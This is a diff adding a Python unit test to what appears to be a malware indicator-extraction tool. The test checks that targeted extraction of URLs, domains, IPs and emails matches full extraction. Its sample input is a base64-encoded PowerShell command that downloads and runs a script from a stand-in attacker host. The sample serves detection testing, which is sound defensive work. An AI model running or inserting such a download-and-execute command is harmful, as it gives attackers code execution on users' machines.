@@ -110,6 +110,21 @@ class ScriptTests(unittest.TestCase):
         self.assertEqual(found["sha256"], ["a" * 64])
         self.assertIn("C:\\Users\\Public\\x.exe", found["path"])
 
+    def test_targeted_collect_matches_full_collect(self):
+        payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1') 10.9.8.7"
+        script = ("powershell -EncodedCommand " + base64.b64encode(payload.encode("utf-16-le")).decode()
+                  + " # admin@example.org").encode()
+        full = collect(script)
+        for kind in ("url", "domain", "ipv4", "email"):
+            with self.subTest(kind=kind):
+                targeted = collect(script, ioc_kinds={kind}, want_metadata=False)
+                self.assertEqual(targeted.iocs, {kind: full.iocs[kind]})
+                self.assertEqual(targeted.metadata, {})
+        document = office(**{"dc:creator": "Jane"})
+        only_metadata = collect(document, ioc_kinds=set(), want_blobs=False)
+        self.assertEqual(only_metadata.metadata, collect(document).metadata)
+        self.assertEqual((only_metadata.iocs, only_metadata.blobs), ({}, []))
+
 
 class FactSolverTests(unittest.TestCase):
     def test_unique_metadata_value_answers(self):
